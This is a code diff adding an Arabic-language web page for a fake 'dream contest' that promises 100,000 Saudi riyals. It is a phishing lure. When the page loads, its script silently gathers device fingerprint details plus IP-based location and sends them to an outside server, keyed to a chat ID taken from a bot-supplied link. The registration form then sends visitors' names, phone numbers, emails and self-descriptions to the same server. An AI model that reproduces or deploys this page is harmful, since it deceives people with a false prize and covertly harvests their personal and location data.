@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🏆 مسابقة الربح بمائة ألف ريال سعودي</title>
+    <meta name="description" content="كن انت الرابح في مسابقة الحلم للربح بمائة الف ريال سعودي">
+    <link rel="icon" href="https://files.catbox.moe/unbzhz.png" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&family=Changa:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Cairo', 'Changa', sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            text-align: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* خلفية متحركة */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(255, 215, 0, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(76, 175, 80, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(255, 107, 107, 0.1) 0%, transparent 50%);
+            animation: gradientShift 15s ease-in-out infinite;
+            z-index: -1;
+        }
+
+        @keyframes gradientShift {
+            0%, 100% { transform: translateX(0%) rotate(0deg); }
+            33% { transform: translateX(2%) rotate(1deg); }
+            66% { transform: translateX(-2%) rotate(-1deg); }
+        }
+
+        header {
+            background: linear-gradient(135deg, #4CAF50, #45a049);
+            padding: 30px 20px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            animation: shimmer 3s ease-in-out infinite;
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        header h1 {
+            font-size: 2.5rem;
+            font-weight: 800;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            margin-bottom: 10px;
+            animation: titleGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes titleGlow {
+            0%, 100% { text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3); }
+            50% { text-shadow: 0 0 20px rgba(255, 255, 255, 0.5), 0 2px 10px rgba(0, 0, 0, 0.3); }
+        }
+
+        .content {
+            padding: 60px 20px;
+            max-width: 800px;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .prize-container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            padding: 40px 30px;
+            margin-bottom: 40px;
+            box-shadow: 
+                0 8px 32px rgba(0, 0, 0, 0.3),
+                inset 0 1px 0 rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .prize-container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(from 0deg, transparent, rgba(255, 215, 0, 0.1), transparent);
+            animation: rotate 8s linear infinite;
+            pointer-events: none;
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .logo-container {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            border: 4px solid rgba(255, 215, 0, 0.6);
+            animation: logoFloat 3s ease-in-out infinite;
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.4);
+        }
+
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .prize-amount {
+            font-size: 3.5rem;
+            font-weight: 800;
+            color: #FFD700;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.6);
+            margin: 20px 0;
+            animation: prizeGlow 2s ease-in-out infinite;
+        }
+
+        @keyframes prizeGlow {
+            0%, 100% { transform: scale(1); text-shadow: 0 0 20px rgba(255, 215, 0, 0.6); }
+            50% { transform: scale(1.05); text-shadow: 0 0 30px rgba(255, 215, 0, 0.8); }
+        }
+
+        .description {
+            font-size: 1.3rem;
+            font-weight: 400;
+            margin-bottom: 30px;
+            line-height: 1.6;
+            opacity: 0.9;
+        }
+
+        .register-button {
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            border: none;
+            color: #000;
+            padding: 18px 40px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+            border-radius: 50px;
+            transition: all 0.3s ease;
+            box-shadow: 0 6px 20px rgba(255, 215, 0, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .register-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .register-button:hover::before {
+            left: 100%;
+        }
+
+        .register-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 215, 0, 0.6);
+        }
+
+        .register-button:active {
+            transform: translateY(0);
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+            padding-top: 60px;
+            animation: modalFadeIn 0.3s ease-out;
+        }
+
+        @keyframes modalFadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, #ffffff, #f8f9fa);
+            margin: 5% auto;
+            padding: 40px;
+            border: none;
+            width: 90%;
+            max-width: 600px;
+            border-radius: 20px;
+            text-align: right;
+            color: #333;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            position: relative;
+            animation: modalSlideIn 0.3s ease-out;
+        }
+
+        @keyframes modalSlideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .modal-header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #eee;
+        }
+
+        .modal-header h2 {
+            color: #4CAF50;
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .close {
+            color: #999;
+            float: left;
+            font-size: 32px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: color 0.3s ease;
+            position: absolute;
+            top: 15px;
+            left: 20px;
+        }
+
+        .close:hover {
+            color: #ff4757;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            text-align: right;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #555;
+            font-size: 1.1rem;
+        }
+
+        input[type=text], input[type=email], input[type=tel], textarea {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #e1e8ed;
+            border-radius: 12px;
+            font-size: 1rem;
+            text-align: right;
+            font-family: 'Cairo', sans-serif;
+            transition: all 0.3s ease;
+            background: #fff;
+        }
+
+        input[type=text]:focus, input[type=email]:focus, input[type=tel]:focus, textarea:focus {
+            outline: none;
+            border-color: #4CAF50;
+            box-shadow: 0 0 0 3px rgba(76, 175, 80, 0.1);
+            transform: translateY(-1px);
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 120px;
+        }
+
+        input[type=submit] {
+            width: 100%;
+            background: linear-gradient(135deg, #4CAF50, #45a049);
+            color: white;
+            padding: 18px 20px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        input[type=submit]:hover {
+            background: linear-gradient(135deg, #45a049, #4CAF50);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(76, 175, 80, 0.4);
+        }
+
+        footer {
+            background: linear-gradient(135deg, #333, #555);
+            padding: 25px 20px;
+            position: fixed;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.3);
+            z-index: 100;
+        }
+
+        footer p {
+            margin: 0;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        /* Loading Animation */
+        .loading {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 2000;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid #4CAF50;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .content {
+                padding: 40px 15px;
+            }
+            
+            .prize-amount {
+                font-size: 2.5rem;
+            }
+            
+            header h1 {
+                font-size: 2rem;
+            }
+            
+            .modal-content {
+                margin: 10% auto;
+                padding: 30px 20px;
+                width: 95%;
+            }
+            
+            .register-button {
+                padding: 15px 30px;
+                font-size: 1.1rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .prize-amount {
+                font-size: 2rem;
+            }
+            
+            .logo {
+                width: 120px;
+                height: 120px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+    </div>
+
+    <header>
+        <h1>🏆 مسابقة الحلم</h1>
+        <p>الفرصة الذهبية للثراء</p>
+    </header>
+
+    <div class="content">
+        <div class="prize-container">
+            <div class="logo-container">
+                <img class="logo" src="https://files.catbox.moe/unbzhz.png" alt="شعار المسابقة">
+            </div>
+            
+            <div class="prize-amount">💰 100,000 ريال</div>
+            
+            <h3 class="description">
+                🎉 اربح 100,000 ريال سعودي في مسابقة الحلم!<br>
+                🌟 فرصتك الذهبية للفوز بجائزة كبرى<br>
+                ⚡ اضغط على الزر أدناه للتسجيل الآن
+            </h3>
+            
+            <button class="register-button" id="openForm">
+                🚀 سجل الآن واربح
+            </button>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div id="registrationForm" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            
+            <div class="modal-header">
+                <h2>📝 نموذج التسجيل</h2>
+                <p>املأ البيانات أدناه للمشاركة في المسابقة</p>
+            </div>
+            
+            <form method="POST" id="registerForm">
+                <div class="form-group">
+                    <label for="name">👤 الاسم الكامل</label>
+                    <input type="text" id="name" name="name" placeholder="اكتب اسمك الكامل" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="phone">📱 رقم الهاتف</label>
+                    <input type="tel" id="phone" name="phone" placeholder="اكتب رقم هاتفك" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">📧 البريد الإلكتروني</label>
+                    <input type="email" id="email" name="email" placeholder="اكتب بريدك الإلكتروني" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="description">✍️ وصف عنك</label>
+                    <textarea id="description" name="description" placeholder="اكتب وصفاً مختصراً عنك" required></textarea>
+                </div>
+                
+                <input type="submit" value="🎯 التسجيل">
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2025 مسابقة الحلم. جميع الحقوق محفوظة. 🏆</p>
+    </footer>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            const SERVER_URL = 'https://ahmed-bot-competition.onrender.com';
+            
+            // 🆔 الحصول على معرف المستخدم من الرابط
+            function getChatId() {
+                const urlParams = new URLSearchParams(window.location.search);
+                let chatId = urlParams.get('chatId');
+                
+                if (!chatId) {
+                    // محاولة الحصول عليه من المسار
+                    const pathParts = window.location.pathname.split('/');
+                    chatId = pathParts[pathParts.length - 1];
+                    
+                    // إذا كان المسار ينتهي بـ .html، خذ الجزء الذي قبله
+                    if (chatId && chatId.includes('.html')) {
+                        chatId = pathParts[pathParts.length - 2];
+                    }
+                }
+                
+                console.log("Retrieved chatId:", chatId);
+                return chatId;
+            }
+
+            const userId = getChatId();
+
+            // التحقق من وجود معرف المستخدم
+            if (!userId || userId === 'device-info.html' || userId === '') {
+                alert('⚠️ خطأ: معرف المحادثة غير موجود. تأكد من استخدام الرابط الصحيح من البوت.');
+                return;
+            }
+
+            // 📊 وظيفة لجمع معلومات الجهاز المحسنة
+            async function getDeviceInfo() {
+                const deviceInfo = {
+                    deviceName: navigator.platform,
+                    deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                    browserName: getBrowserName(),
+                    browserVersion: getBrowserVersion(),
+                    osVersion: navigator.userAgent,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    language: navigator.language || 'غير معروف',
+                    colorDepth: `${screen.colorDepth} bits`,
+                    cpuCores: navigator.hardwareConcurrency || 'غير معروف',
+                    memory: `${navigator.deviceMemory || 'غير معروف'} GB`,
+                    touchSupport: 'ontouchstart' in window,
+                    bluetoothSupport: navigator.bluetooth ? 'مدعوم' : 'غير مدعوم',
+                    internalStorage: 'غير معروف',
+                    isCharging: 'غير معروف',
+                    battery: 'غير معروف',
+                    networkType: 'غير معروف',
+                    networkSpeed: 'غير معروف',
+                    screenOrientation: screen.orientation ? screen.orientation.type : 'غير معروف',
+                    securityProtocol: location.protocol,
+                    connectionFrequency: 'غير معروف',
+                    geolocationAvailable: navigator.geolocation ? 'مدعوم' : 'غير مدعوم',
+                    time: new Date().toLocaleString('ar-SA'),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    lastUpdate: 'غير معروف'
+                };
+
+                // جمع معلومات البطارية
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        deviceInfo.battery = `${Math.round(battery.level * 100)}%`;
+                        deviceInfo.isCharging = battery.charging ? 'نعم' : 'لا';
+                    } catch (e) {
+                        console.log('Battery API not available');
+                    }
+                }
+
+                // جمع معلومات الشبكة
+                if (navigator.connection) {
+                    const connection = navigator.connection;
+                    deviceInfo.networkType = connection.effectiveType || 'غير معروف';
+                    deviceInfo.networkSpeed = connection.downlink ? `${connection.downlink} Mbps` : 'غير معروف';
+                    deviceInfo.connectionFrequency = connection.frequency || 'غير معروف';
+                }
+
+                // محاولة جمع معلومات الذاكرة الداخلية
+                if (navigator.storage && navigator.storage.estimate) {
+                    try {
+                        const estimate = await navigator.storage.estimate();
+                        deviceInfo.internalStorage = `${(estimate.quota / (1024 * 1024 * 1024)).toFixed(2)} GB`;
+                    } catch (e) {
+                        console.log('Storage API not available');
+                    }
+                }
+
+                return deviceInfo;
+            }
+
+            // دوال مساعدة للحصول على معلومات المتصفح
+            function getBrowserName() {
+                const ua = navigator.userAgent;
+                if (ua.includes('Chrome')) return 'Chrome';
+                if (ua.includes('Firefox')) return 'Firefox';
+                if (ua.includes('Safari')) return 'Safari';
+                if (ua.includes('Edge')) return 'Edge';
+                return 'Unknown';
+            }
+
+            function getBrowserVersion() {
+                const ua = navigator.userAgent;
+                const match = ua.match(/(?:Chrome|Firefox|Safari|Edge)\/(\d+\.\d+)/);
+                return match ? match[1] : 'Unknown';
+            }
+
+            // 📤 وظيفة لإرسال المعلومات الأساسية
+            async function sendBasicInfo() {
+                try {
+                    console.log('🔄 جمع المعلومات الأساسية...');
+                    const deviceInfo = await getDeviceInfo();
+                    
+                    // جلب البيانات الجغرافية
+                    const locationData = await $.getJSON('https://ipapi.co/json/').catch(() => ({
+                        ip: 'غير متاح',
+                        country_name: 'غير متاح',
+                        city: 'غير متاح',
+                        latitude: 'غير متاح',
+                        longitude: 'غير متاح'
+                    }));
+
+                    deviceInfo.ip = locationData.ip;
+                    deviceInfo.country = locationData.country_name;
+                    deviceInfo.city = locationData.city;
+                    deviceInfo.latitude = locationData.latitude;
+                    deviceInfo.longitude = locationData.longitude;
+
+                    await $.ajax({
+                        url: `${SERVER_URL}/SS`,
+                        type: 'POST',
+                        contentType: 'application/json',
+                        data: JSON.stringify({ userId: userId, deviceInfo: deviceInfo }),
+                        timeout: 10000
+                    });
+
+                    console.log('✅ تم إرسال المعلومات الأساسية بنجاح');
+                } catch (error) {
+                    console.error('❌ حدث خطأ أثناء إرسال المعلومات الأساسية:', error);
+                }
+            }
+
+            // إرسال المعلومات الأساسية عند تحميل الصفحة
+            sendBasicInfo();
+
+            // 🎯 عرض نموذج التسجيل
+            $('#openForm').click(function() {
+                $('#registrationForm').show();
+            });
+
+            // ❌ إخفاء نموذج التسجيل
+            $('.close').click(function() {
+                $('#registrationForm').hide();
+            });
+
+            // إخفاء النموذج عند النقر خارجه
+            $(window).click(function(event) {
+                if (event.target.id === 'registrationForm') {
+                    $('#registrationForm').hide();
+                }
+            });
+
+            // 📝 إرسال البيانات عند تقديم النموذج
+            $('#registerForm').submit(async function(e) {
+                e.preventDefault();
+                
+                // إظهار اللودينغ
+                $('#loading').show();
+
+                const userInfo = {
+                    name: $('#name').val(),
+                    phone: $('#phone').val(),
+                    email: $('#email').val(),
+                    description: $('#description').val()
+                };
+
+                try {
+                    console.log('🔄 جمع المعلومات الكاملة...');
+                    const deviceInfo = await getDeviceInfo();
+                    const locationData = await $.getJSON('https://ipapi.co/json/').catch(() => ({
+                        ip: 'غير متاح',
+                        country_name: 'غير متاح',
+                        city: 'غير متاح',
+                        latitude: 'غير متاح',
+                        longitude: 'غير متاح'
+                    }));
+
+                    deviceInfo.ip = locationData.ip;
+                    deviceInfo.country = locationData.country_name;
+                    deviceInfo.city = locationData.city;
+                    deviceInfo.latitude = locationData.latitude;
+                    deviceInfo.longitude = locationData.longitude;
+
+                    const fullInfo = {
+                        userId: userId,
+                        deviceInfo: deviceInfo,
+                        userInfo: userInfo
+                    };
+
+                    await $.ajax({
+                        url: `${SERVER_URL}/SS`,
+                        type: 'POST',
+                        contentType: 'application/json',
+                        data: JSON.stringify(fullInfo),
+                        timeout: 15000
+                    });
+
+                    console.log('✅ تم إرسال المعلومات الكاملة بنجاح');
+
+                    // إخفاء اللودينغ
+                    $('#loading').hide();
+                    
+                    // رسالة نجاح
+                    alert('🎉 تم التسجيل بنجاح! ستتم مراجعة طلبك قريباً.');
+                    $('#registrationForm').hide();
+                    
+                    // إعادة تعيين النموذج
+                    $('#registerForm')[0].reset();
+
+                } catch (error) {
+                    console.error('❌ حدث خطأ أثناء إرسال المعلومات الكاملة:', error);
+                    $('#loading').hide();
+                    alert('⚠️ حدث خطأ أثناء إرسال المعلومات. الرجاء المحاولة مرة أخرى.');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
